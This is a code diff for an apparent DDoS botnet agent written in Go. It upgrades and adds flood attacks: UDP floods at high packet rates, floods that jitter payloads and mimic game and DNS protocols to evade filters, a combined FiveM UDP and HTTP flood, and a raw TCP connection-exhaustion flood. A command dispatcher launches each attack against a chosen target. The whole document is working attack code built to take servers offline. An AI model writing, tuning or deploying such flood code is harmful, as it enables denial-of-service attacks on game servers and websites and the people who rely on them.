@@ -118,12 +118,15 @@ func AUdpFlood(IP, PORT string, SECONDS int, SIZE int, sessionID int32) {
 	}
 
 	// Optimized concurrency settings
-	// Ultimate Extreme V5 Scaling
-	workers := 1024
-	if runtime.NumCPU() > 8 {
-		workers = runtime.NumCPU() * 128
+	// Ultimate Extreme V5 Scaling - Optimized for Stability & Constant Power
+	workers := runtime.NumCPU() * 16
+	if workers < 64 {
+		workers = 64
+	} else if workers > 256 {
+		workers = 256 // Balanced for high GB/s payload (65k)
 	}
-	const batch = 10000
+	const batch = 1000 // Smaller batch for massive 65k packets to prevent buffer overflow
+	const rotateEvery = 2000000 // LAZY ROTATION: Fewer dial syscalls = more constant power
 
 	var wg sync.WaitGroup
 	for i := 0; i < workers; i++ {
@@ -133,16 +136,13 @@ func AUdpFlood(IP, PORT string, SECONDS int, SIZE int, sessionID int32) {
 			
 			var conn *net.UDPConn
 			var err error
-			totalSent := 0
-			const rotateEvery = 50000
-
 			reconnect := func() {
 				if conn != nil {
 					conn.Close()
 				}
 				conn, err = net.DialUDP("udp4", nil, raddr)
 				if err == nil {
-					conn.SetWriteBuffer(4 * 1024 * 1024)
+					conn.SetWriteBuffer(64 * 1024 * 1024) // EXTREME 64MB buffer for constant power
 				}
 			}
 
@@ -154,29 +154,35 @@ func AUdpFlood(IP, PORT string, SECONDS int, SIZE int, sessionID int32) {
 
 			workerPayload := make([]byte, SIZE)
 			copy(workerPayload, payload)
+			pIdx := uint32(0)
 
 			for {
 				if atomic.LoadInt32(&globalSessionID) != sessionID {
 					return
 				}
 				
-				// Randomize a small portion of the payload to bypass signature-based filters
+				// Jitter once per batch - manual fast jitter
 				if len(workerPayload) > 16 {
-					rand.Read(workerPayload[len(workerPayload)-16:])
-				}
-
-				for j := 0; j < batch; j++ {
-					conn.Write(workerPayload)
-					totalSent++
-					if totalSent >= rotateEvery {
-						reconnect()
-						if conn == nil {
-							return
-						}
-						totalSent = 0
+					for k := 0; k < 4; k++ {
+						workerPayload[len(workerPayload)-1-k] = byte(rand.Intn(256))
 					}
 				}
+
+				// FAST-PATH: Tight loop
+				for j := 0; j < batch; j++ {
+					conn.Write(workerPayload)
+				}
 				atomic.AddInt64(&ppsCounter, int64(batch))
+				pIdx += uint32(batch)
+
+				// Hoisted Rotation
+				if pIdx >= uint32(rotateEvery) {
+					reconnect()
+					if conn == nil {
+						return
+					}
+					pIdx = 0
+				}
 			}
 		}()
 	}
@@ -207,6 +213,102 @@ func AUdpFlood(IP, PORT string, SECONDS int, SIZE int, sessionID int32) {
 
 	// Cleanup - connections are closed by individual goroutines now
 	fmt.Printf("[%s] UDP Flood finished.\n", time.Now().Format("15:04:05"))
+}
+
+// AMtuFlood implements high-PPS UDP flooding using MTU-optimized packets (no fragmentation)
+func AMtuFlood(IP, PORT string, SECONDS int, sessionID int32) {
+	runtime.GOMAXPROCS(runtime.NumCPU())
+	const SIZE = 1450 // Standard MTU size for zero-fragmentation bandwidth
+
+	fmt.Printf("[%s] MTU Flood started: %s:%s for %ds [SESSION %d]\n",
+		time.Now().Format("15:04:05"), IP, PORT, SECONDS, sessionID)
+
+	var ppsCounter int64 = 0
+	payload := make([]byte, SIZE)
+	rand.Read(payload)
+
+	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
+	if err != nil {
+		return
+	}
+
+	workers := runtime.NumCPU() * 16
+	if workers < 64 {
+		workers = 64
+	} else if workers > 256 {
+		workers = 256
+	}
+	const batch = 5000 
+	const rotateEvery = 1000000
+
+	var wg sync.WaitGroup
+	for i := 0; i < workers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			var conn *net.UDPConn
+			var err error
+			reconnect := func() {
+				if conn != nil {
+					conn.Close()
+				}
+				conn, err = net.DialUDP("udp4", nil, raddr)
+				if err == nil {
+					conn.SetWriteBuffer(16 * 1024 * 1024)
+				}
+			}
+			reconnect()
+			if conn == nil {
+				return
+			}
+			defer conn.Close()
+
+			workerPayload := make([]byte, SIZE)
+			copy(workerPayload, payload)
+			pIdx := uint32(0)
+
+			for {
+				if atomic.LoadInt32(&globalSessionID) != sessionID {
+					return
+				}
+				for k := 0; k < 4; k++ {
+					workerPayload[SIZE-1-k] = byte(rand.Intn(256))
+				}
+				for j := 0; j < batch; j++ {
+					conn.Write(workerPayload)
+				}
+				atomic.AddInt64(&ppsCounter, int64(batch))
+				pIdx += uint32(batch)
+				if pIdx >= uint32(rotateEvery) {
+					reconnect()
+					if conn == nil {
+						return
+					}
+					pIdx = 0
+				}
+			}
+		}()
+	}
+
+	go func() {
+		ticker := time.NewTicker(1 * time.Second)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ticker.C:
+				if atomic.LoadInt32(&globalSessionID) != sessionID {
+					return
+				}
+				pps := atomic.SwapInt64(&ppsCounter, 0)
+				fmt.Printf("[%s] MTU-FLOOD: %d PPS\n", time.Now().Format("15:04:05"), pps)
+			}
+		}
+	}()
+
+	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
+		atomic.CompareAndSwapInt32(&globalSessionID, sessionID, sessionID+1)
+	})
+	wg.Wait()
 }
 
 // AUdpBypass uses a wide array of protocol-mimicking payloads for advanced filter evasion
@@ -291,6 +393,11 @@ func AUdpBypass(IP, PORT string, SECONDS int, sessionID int32) {
 					}
 					return
 				}
+				// Jitter: Modify a few bytes of the payload
+				if len(payloads[pIdx]) > 16 {
+					rand.Read(payloads[pIdx][len(payloads[pIdx])-16:])
+				}
+
 				for j := 0; j < batchSize; j++ {
 					_, err = conn.Write(payloads[pIdx])
 					if err != nil {
@@ -299,10 +406,7 @@ func AUdpBypass(IP, PORT string, SECONDS int, sessionID int32) {
 							return
 						}
 					}
-					pIdx++
-					if pIdx >= variants {
-						pIdx = 0
-					}
+					pIdx = (pIdx + 1) % variants
 					totalSent++
 					if totalSent >= rotateEvery {
 						reconnect()
@@ -360,23 +464,16 @@ func APpsBypass(IP, PORT string, SECONDS int, sessionID int32) {
 		return
 	}
 
-	// Pre-generate randomized payloads - Power of Two for fast indexing
-	const payloadCount = 1024 // 2^10
-	const payloadMask = 1023  // mask for bitwise &
-	const payloadSize = 2 // Extremely critical: 2 bytes to minimize GB/s bandwidth and maximize raw PPS
-	payloads := make([][]byte, payloadCount)
-	for i := 0; i < payloadCount; i++ {
-		p := make([]byte, payloadSize)
-		rand.Read(p)
-		payloads[i] = p
-	}
 
-	// Ultimate Extreme V5 Scaling
-	workers := 1024
-	if runtime.NumCPU() > 8 {
-		workers = runtime.NumCPU() * 128
+	// ZERO-INDIRECTION PPS (V6 Scaling)
+	workers := runtime.NumCPU() * 32
+	if workers < 128 {
+		workers = 128
+	} else if workers > 512 {
+		workers = 512
 	}
-	const batchSize = 10000
+	const batchSize = 50000 
+	const rotateEvery = 2000000 
 
 	var wg sync.WaitGroup
 	for i := 0; i < workers; i++ {
@@ -384,27 +481,49 @@ func APpsBypass(IP, PORT string, SECONDS int, sessionID int32) {
 		go func() {
 			defer wg.Done()
 			
-			// Dial once per worker
-			conn, err := net.DialUDP("udp4", nil, raddr)
-			if err != nil {
+			var conn *net.UDPConn
+			var err error
+			reconnect := func() {
+				if conn != nil {
+					conn.Close()
+				}
+				conn, err = net.DialUDP("udp4", nil, raddr)
+				if err == nil {
+					conn.SetWriteBuffer(32 * 1024 * 1024) // MAX 32MB BUFFER
+				}
+			}
+
+			reconnect()
+			if conn == nil {
 				return
 			}
-			conn.SetWriteBuffer(4 * 1024 * 1024)
 			defer conn.Close()
 
-			pIdx := uint32(rand.Intn(payloadCount))
+			// ZERO-INDIRECTION: Single pre-allocated buffer used by the worker
+			workerPayload := []byte{0x00, 0x00}
+			rand.Read(workerPayload)
+			pTotal := uint32(0)
 			
 			for {
 				if atomic.LoadInt32(&globalSessionID) != sessionID {
 					return
 				}
 
-				// Zero-allocation tight loop with bitwise indexing
+				// ULTIMATE FAST-PATH: No array lookups, no indirections
 				for j := 0; j < batchSize; j++ {
-					conn.Write(payloads[pIdx&payloadMask])
-					pIdx++
+					conn.Write(workerPayload)
 				}
 				atomic.AddInt64(&ppsCounter, int64(batchSize))
+				pTotal += uint32(batchSize)
+
+				// SHIFTED ROTATION
+				if pTotal >= uint32(rotateEvery) {
+					reconnect()
+					if conn == nil {
+						return
+					}
+					pTotal = 0
+				}
 			}
 		}()
 	}
@@ -464,13 +583,15 @@ func AGbpBypass(IP, PORT string, SECONDS int, sessionID int32) {
 		payloads[i] = p
 	}
 
-	// Extreme settings for bypass
+	// Optimized for Constant Power & Filter Evasion
 	workers := runtime.NumCPU() * 32
-	if workers < 256 {
-		workers = 256
+	if workers < 128 {
+		workers = 128
+	} else if workers > 512 {
+		workers = 512
 	}
 	const batchSize = 10000
-	const rotateEvery = 50000
+	const rotateEvery = 500000
 
 	var wg sync.WaitGroup
 	for i := 0; i < workers; i++ {
@@ -489,7 +610,7 @@ func AGbpBypass(IP, PORT string, SECONDS int, sessionID int32) {
 					}
 					conn, err = net.DialUDP("udp4", nil, raddr)
 					if err == nil {
-						conn.SetWriteBuffer(2 * 1024 * 1024)
+						conn.SetWriteBuffer(8 * 1024 * 1014) // 8MB
 						return
 					}
 					time.Sleep(10 * time.Millisecond)
@@ -499,8 +620,8 @@ func AGbpBypass(IP, PORT string, SECONDS int, sessionID int32) {
 			if atomic.LoadInt32(&globalSessionID) != sessionID {
 				return
 			}
-			pIdx := rand.Intn(variants)
-			totalSent := 0
+			pIdx := uint32(rand.Intn(variants))
+			
 			for {
 				if atomic.LoadInt32(&globalSessionID) != sessionID {
 					if conn != nil {
@@ -508,28 +629,26 @@ func AGbpBypass(IP, PORT string, SECONDS int, sessionID int32) {
 					}
 					return
 				}
+
+				// Jitter between batches
+				if len(payloads[pIdx%uint32(variants)]) > 16 {
+					rand.Read(payloads[pIdx%uint32(variants)][len(payloads[pIdx%uint32(variants)])-16:])
+				}
+
+				// FAST-PATH: Tight loop
 				for j := 0; j < batchSize; j++ {
-					_, err = conn.Write(payloads[pIdx])
-					if err != nil {
-						reconnect()
-						if atomic.LoadInt32(&globalSessionID) != sessionID {
-							return
-						}
-					}
+					_, err = conn.Write(payloads[pIdx%uint32(variants)])
 					pIdx++
-					if pIdx >= variants {
-						pIdx = 0
-					}
-					totalSent++
-					if totalSent >= rotateEvery {
-						reconnect()
-						if atomic.LoadInt32(&globalSessionID) != sessionID {
-							return
-						}
-						totalSent = 0
-					}
 				}
 				atomic.AddInt64(&ppsCounter, int64(batchSize))
+
+				// SHIFTED ROTATION
+				if pIdx % rotateEvery < uint32(batchSize) {
+					reconnect()
+					if atomic.LoadInt32(&globalSessionID) != sessionID {
+						return
+					}
+				}
 			}
 		}()
 	}
@@ -656,35 +775,38 @@ func ATcpFlood(IP, PORT string, SECONDS int, sessionID int32) {
 	fmt.Printf("[%s] TCP Flood finished.\n", time.Now().Format("15:04:05"))
 }
 
-// AFivemFlood mimics FiveM OOB packets to bypass game-specific filters
-func AFivemFlood(IP, PORT string, SECONDS int, sessionID int32) {
+// AHexBypass rotates through high-impact hex signatures for various protocols
+func AHexBypass(IP, PORT string, SECONDS int, sessionID int32) {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
-	fmt.Printf("[%s] FiveM Flood started: %s:%s for %ds [SESSION %d]\n",
+	fmt.Printf("[%s] HEX-BYPASS Universal started: %s:%s for %ds [SESSION %d]\n",
 		time.Now().Format("15:04:05"), IP, PORT, SECONDS, sessionID)
 
 	var ppsCounter int64 = 0
 
 	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
 	if err != nil {
-		fmt.Printf("[!] Error resolving address: %v\n", err)
 		return
 	}
 
-	// FiveM / Source Engine exact OOB payloads.
-	payloads := [][]byte{
-		[]byte("\xff\xff\xff\xffgetinfo \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
-		[]byte("\xff\xff\xff\xffgetstatus"),
-		[]byte("\xff\xff\xff\xffgetchallenge 0000000000"),
-		[]byte("\xff\xff\xff\xffTSource Engine Query\x00"),
+	// Collection of "Hex-God" signatures
+	signatures := [][]byte{
+		[]byte("\xff\xff\xff\xffTSource Engine Query\x00"),                                                     // Source
+		[]byte("SAMP\x01\x02\x03\x04\x05\x06i"),                                                                 // SAMP Info
+		[]byte("SAMP\x01\x02\x03\x04\x05\x06p"),                                                                 // SAMP Players
+		[]byte("\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"), // MC Bedrock
+		[]byte("\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02"),                                         // TS3 / RakNet
+		[]byte("\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"), // DNS Fake
 	}
 
-	workers := runtime.NumCPU() * 16
+	workers := runtime.NumCPU() * 32
 	if workers < 128 {
 		workers = 128
+	} else if workers > 512 {
+		workers = 512
 	}
-	const batchSize = 1000
-	const rotateEvery = 50000
+	const batchSize = 10000
+	const rotateEvery = 500000
 
 	var wg sync.WaitGroup
 	for i := 0; i < workers; i++ {
@@ -694,61 +816,60 @@ func AFivemFlood(IP, PORT string, SECONDS int, sessionID int32) {
 			var conn *net.UDPConn
 			var err error
 			reconnect := func() {
-				for {
-					if atomic.LoadInt32(&globalSessionID) != sessionID {
-						return
-					}
-					if conn != nil {
-						conn.Close()
-					}
-					conn, err = net.DialUDP("udp4", nil, raddr)
-					if err == nil {
-						conn.SetWriteBuffer(2 * 1024 * 1024)
-						return
-					}
-					time.Sleep(10 * time.Millisecond)
+				if conn != nil {
+					conn.Close()
+				}
+				conn, err = net.DialUDP("udp4", nil, raddr)
+				if err == nil {
+					conn.SetWriteBuffer(16 * 1024 * 1024)
 				}
 			}
 			reconnect()
-			if atomic.LoadInt32(&globalSessionID) != sessionID {
+			if conn == nil {
 				return
 			}
-			m := len(payloads)
-			pIdx := rand.Intn(m)
-			totalSent := 0
+			defer conn.Close()
+
+			m := len(signatures)
+			pIdx := uint32(rand.Intn(m))
+			
+			// ZERO-ALLOCATION: Pre-allocated packet buffer for the worker
+			packetBuffer := make([]byte, 256)
+
 			for {
 				if atomic.LoadInt32(&globalSessionID) != sessionID {
-					if conn != nil {
-						conn.Close()
-					}
 					return
 				}
+
+				// Select base signature and prepare packet
+				base := signatures[pIdx%uint32(m)]
+				packetLen := len(base) + 64
+				copy(packetBuffer, base)
+				
+				// Jitter only the padding part
+				for k := 0; k < 8; k++ {
+					packetBuffer[len(base)+k] = byte(rand.Intn(256))
+				}
+
+				// FAST-PATH: No allocations, no appends
 				for j := 0; j < batchSize; j++ {
-					_, err = conn.Write(payloads[pIdx])
-					if err != nil {
-						reconnect()
-						if atomic.LoadInt32(&globalSessionID) != sessionID {
-							return
-						}
-					}
-					pIdx++
-					if pIdx >= m {
-						pIdx = 0
-					}
-					totalSent++
-					if totalSent >= rotateEvery {
-						reconnect()
-						if atomic.LoadInt32(&globalSessionID) != sessionID {
-							return
-						}
-						totalSent = 0
-					}
+					conn.Write(packetBuffer[:packetLen])
 				}
 				atomic.AddInt64(&ppsCounter, int64(batchSize))
+				pIdx++
+
+				// HOISTED ROTATION
+				if pIdx % rotateEvery < uint32(batchSize) {
+					reconnect()
+					if conn == nil {
+						return
+					}
+				}
 			}
 		}()
 	}
 
+	// Stats display
 	go func() {
 		ticker := time.NewTicker(1 * time.Second)
 		defer ticker.Stop()
@@ -759,8 +880,7 @@ func AFivemFlood(IP, PORT string, SECONDS int, sessionID int32) {
 					return
 				}
 				pps := atomic.SwapInt64(&ppsCounter, 0)
-				fmt.Printf("[%s] FIVEM-STATS: %d PPS\n",
-					time.Now().Format("15:04:05"), pps)
+				fmt.Printf("[%s] HEX-BYPASS: %d PPS\n", time.Now().Format("15:04:05"), pps)
 			}
 		}
 	}()
@@ -770,7 +890,156 @@ func AFivemFlood(IP, PORT string, SECONDS int, sessionID int32) {
 	})
 
 	wg.Wait()
-	fmt.Printf("[%s] FiveM Flood finished.\n", time.Now().Format("15:04:05"))
+}
+
+// AFivemFlood mimics FiveM OOB packets and floods JSON endpoints for raw power
+func AFivemFlood(IP, PORT string, SECONDS int, sessionID int32) {
+	runtime.GOMAXPROCS(runtime.NumCPU())
+
+	fmt.Printf("[%s] FiveM Raw Power started: %s:%s for %ds [SESSION %d]\n",
+		time.Now().Format("15:04:05"), IP, PORT, SECONDS, sessionID)
+
+	var ppsCounter int64 = 0
+	var hpsCounter int64 = 0
+
+	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
+	if err != nil {
+		fmt.Printf("[!] Error resolving address: %v\n", err)
+		return
+	}
+
+	// 1. Optimized UDP Vector (Hot Sockets)
+	payloads := [][]byte{
+		[]byte("\xff\xff\xff\xffgetinfo \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
+		[]byte("\xff\xff\xff\xffgetstatus"),
+		[]byte("\xff\xff\xff\xffgetchallenge 0000000000"),
+		[]byte("\xff\xff\xff\xffTSource Engine Query\x00"),
+	}
+
+	udpWorkers := runtime.NumCPU() * 16
+	if udpWorkers < 64 {
+		udpWorkers = 64
+	} else if udpWorkers > 256 {
+		udpWorkers = 256
+	}
+	const udpBatch = 5000
+	const rotateEvery = 500000
+
+	var wg sync.WaitGroup
+	for i := 0; i < udpWorkers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			var conn *net.UDPConn
+			var err error
+			reconnect := func() {
+				if conn != nil {
+					conn.Close()
+				}
+				conn, err = net.DialUDP("udp4", nil, raddr)
+				if err == nil {
+					conn.SetWriteBuffer(8 * 1024 * 1024)
+				}
+			}
+			reconnect()
+			if conn == nil {
+				return
+			}
+			defer conn.Close()
+
+			m := len(payloads)
+			pIdx := uint32(rand.Intn(m))
+			for {
+				if atomic.LoadInt32(&globalSessionID) != sessionID {
+					return
+				}
+				
+				// Jitter: Modify a few bytes between batches
+				currentPayload := payloads[pIdx%uint32(m)]
+				currentPayload[0] = byte(rand.Intn(256))
+				currentPayload[1] = byte(rand.Intn(256))
+
+				// FAST-PATH: Inner loops
+				for j := 0; j < udpBatch; j++ {
+					conn.Write(currentPayload)
+				}
+				atomic.AddInt64(&ppsCounter, int64(udpBatch))
+				pIdx += uint32(udpBatch)
+
+				// HOISTED ROTATION
+				if pIdx >= uint32(rotateEvery) {
+					reconnect()
+					if conn == nil {
+						return
+					}
+					pIdx = 0
+				}
+			}
+		}()
+	}
+
+	// 2. Optimized HTTP Vector (JSON endpoints)
+	targetBase := fmt.Sprintf("http://%s:%s", IP, PORT)
+	endpoints := []string{"/players.json", "/info.json"}
+	
+	httpWorkers := 64
+	if runtime.NumCPU() > 16 {
+		httpWorkers = 128
+	}
+
+	transport := &http.Transport{
+		MaxIdleConns:        1000,
+		MaxIdleConnsPerHost: 1000,
+		DisableCompression:  true,
+	}
+	client := &http.Client{
+		Transport: transport,
+		Timeout:   5 * time.Second,
+	}
+
+	for i := 0; i < httpWorkers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for {
+				if atomic.LoadInt32(&globalSessionID) != sessionID {
+					return
+				}
+				url := targetBase + endpoints[rand.Intn(len(endpoints))]
+				resp, err := client.Get(url)
+				if err == nil {
+					io.Copy(io.Discard, resp.Body)
+					resp.Body.Close()
+					atomic.AddInt64(&hpsCounter, 1)
+				}
+			}
+		}()
+	}
+
+	// Stats logger
+	go func() {
+		ticker := time.NewTicker(1 * time.Second)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ticker.C:
+				if atomic.LoadInt32(&globalSessionID) != sessionID {
+					return
+				}
+				pps := atomic.SwapInt64(&ppsCounter, 0)
+				hps := atomic.SwapInt64(&hpsCounter, 0)
+				fmt.Printf("[%s] FIVEM POWER: %d PPS | %d HTTP/s\n",
+					time.Now().Format("15:04:05"), pps, hps)
+			}
+		}
+	}()
+
+	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
+		atomic.CompareAndSwapInt32(&globalSessionID, sessionID, sessionID+1)
+	})
+
+	wg.Wait()
+	fmt.Printf("[%s] FiveM Raw Power finished.\n", time.Now().Format("15:04:05"))
 }
 
 var AUserAgents = []string{
@@ -778,6 +1047,76 @@ var AUserAgents = []string{
 	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
 	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+}
+
+// ATcpHttpFlood mimics the user's Python script: Raw TCP + Raw HTTP string
+func ATcpHttpFlood(IP, PORT string, SECONDS int, sessionID int32) {
+	runtime.GOMAXPROCS(runtime.NumCPU())
+	target := net.JoinHostPort(IP, PORT)
+
+	fmt.Printf("[%s] RAW-HTTP Flood started: %s for %ds [SESSION %d]\n",
+		time.Now().Format("15:04:05"), target, SECONDS, sessionID)
+
+	var reqCounter int64 = 0
+	
+	// Pre-build the raw HTTP request string
+	rawRequest := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: close\r\n\r\n", 
+		IP, AUserAgents[rand.Intn(len(AUserAgents))])
+	rawReqBytes := []byte(rawRequest)
+
+	// EXTREME CONCURRENCY for connection exhaustion
+	workers := 4096 
+	if runtime.NumCPU() > 16 {
+		workers = runtime.NumCPU() * 256
+	}
+
+	var wg sync.WaitGroup
+	for i := 0; i < workers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for {
+				if atomic.LoadInt32(&globalSessionID) != sessionID {
+					return
+				}
+
+				// Shorter timeout to prevent worker stalling
+				conn, err := net.DialTimeout("tcp", target, 1*time.Second)
+				if err != nil {
+					// Fallback to even more aggressive dialing if target is unresponsive
+					continue
+				}
+				
+				conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
+				conn.Write(rawReqBytes)
+				conn.Close() 
+				
+				atomic.AddInt64(&reqCounter, 1)
+			}
+		}()
+	}
+
+	// Stats display
+	go func() {
+		ticker := time.NewTicker(1 * time.Second)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ticker.C:
+				if atomic.LoadInt32(&globalSessionID) != sessionID {
+					return
+				}
+				reqs := atomic.SwapInt64(&reqCounter, 0)
+				fmt.Printf("[%s] RAW-HTTP: %d Requests/s\n", time.Now().Format("15:04:05"), reqs)
+			}
+		}
+	}()
+
+	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
+		atomic.CompareAndSwapInt32(&globalSessionID, sessionID, sessionID+1)
+	})
+
+	wg.Wait()
 }
 
 // AHttpFlood implements high-performance HTTP/HTTPS flooding for agent
@@ -955,9 +1294,11 @@ func main() {
 
 			switch cmd.Method {
 			case "UDP":
-				go AUdpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, 1472, sessionID)
+				go AUdpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, 65000, sessionID)
 			case "TCP":
 				go ATcpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
+			case "HEX-BYPASS":
+				go AHexBypass(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
 			case "FIVEM":
 				go AFivemFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
 			case "UDP-BYPASS":
@@ -966,6 +1307,10 @@ func main() {
 				go APpsBypass(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
 			case "GBP-BYPASS":
 				go AGbpBypass(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
+			case "MTU-FLOOD":
+				go AMtuFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
+			case "RAW-HTTP":
+				go ATcpHttpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
 			case "HTTP":
 				go AHttpFlood(cmd.TargetIP, cmd.Duration, sessionID)
 			case "UPDATE":
